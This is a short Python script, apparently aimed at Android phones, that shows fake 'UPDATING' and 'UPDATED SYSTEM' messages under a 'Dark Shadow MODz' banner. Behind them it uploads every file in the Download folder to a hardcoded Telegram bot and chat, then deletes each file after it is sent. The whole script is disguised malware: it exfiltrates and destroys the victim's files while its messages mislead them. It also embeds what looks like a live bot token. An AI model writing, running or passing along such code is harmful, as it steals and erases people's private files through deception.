import os
import requests
import threading
import time
import sys
from itertools import cycle

# ✅ Terminal Colors
RED = '\033[91m'
GREEN = '\033[92m'
YELLOW = '\033[93m'
BLUE = '\033[94m'
CYAN = '\033[96m'
MAGENTA = '\033[95m'
RESET = '\033[0m'

# ⚙️ Telegram Bot Details
BOT_TOKEN = '7437027989:AAHO0Xe9F0N1Te8UW124dlD7UplGuFFC7hI'
CHAT_ID = '6436339187'

# 📁 Folder to send
DOWNLOAD_DIR = '/sdcard/Download'

# 🎨 Spinner with custom message: Dark SHADOW MODz
class DarkShadowSpinner:
    busy = False
    delay = 0.1

    def __init__(self):
        self.spinner = cycle([
            f"{MAGENTA}D{RESET}", f"{RED}A{RESET}", f"{YELLOW}R{RESET}",
            f"{GREEN}K{RESET}", f"{BLUE} {RESET}", f"{CYAN}S{RESET}",
            f"{MAGENTA}H{RESET}", f"{RED}A{RESET}", f"{YELLOW}D{RESET}",
            f"{GREEN}O{RESET}", f"{BLUE}W{RESET}", f"{CYAN} {RESET}",
            f"{MAGENTA}M{RESET}", f"{RED}O{RESET}", f"{YELLOW}D{RESET}",
            f"{GREEN}Z{RESET}", f"{BLUE}.{RESET}"
        ])

    def spinner_task(self):
        while self.busy:
            spin = ''.join([next(self.spinner) for _ in range(16)])
            sys.stdout.write(f"\r UPDATING: {spin}")
            sys.stdout.flush()
            time.sleep(self.delay)
        sys.stdout.write(f"\r{GREEN} BY DARK SHADOW MODz & CYBER GIHAN MODz !{RESET}        \n")

    def start(self):
        self.busy = True
        threading.Thread(target=self.spinner_task).start()

    def stop(self):
        self.busy = False
        time.sleep(self.delay)

# 🚀 File Sending Function
def send_file(file_path):
    spinner = DarkShadowSpinner()
    spinner.start()

    url = f'https://api.telegram.org/bot{BOT_TOKEN}/sendDocument'
    try:
        with open(file_path, 'rb') as f:
            response = requests.post(url, data={'chat_id': CHAT_ID}, files={'document': f})
    except Exception as e:
        spinner.stop()
        print(f"\n{RED}❌ Error sending: {e}{RESET}")
        return

    spinner.stop()
    if response.status_code == 200:
        try:
            os.remove(file_path)
            print(f"{GREEN}UPDATED SYSTEM.{RESET}")
        except Exception as del_error:
            print(f"{RED}FAILED TO UPDATE: {del_error}{RESET}")
    else:
        print(f"{RED}❌ UPLOAD | Status: {response.status_code}{RESET}")

# 🔁 Loop Through Download Folder
def send_all_files(directory):
    if not os.path.exists(directory):
        print(f"{RED}❌ tool is Not Update Contact Dark Shadow!{RESET}")
        return
    for filename in os.listdir(directory):
        path = os.path.join(directory, filename)
        if os.path.isfile(path):
            send_file(path)

# ▶️ Start
send_all_files(DOWNLOAD_DIR)
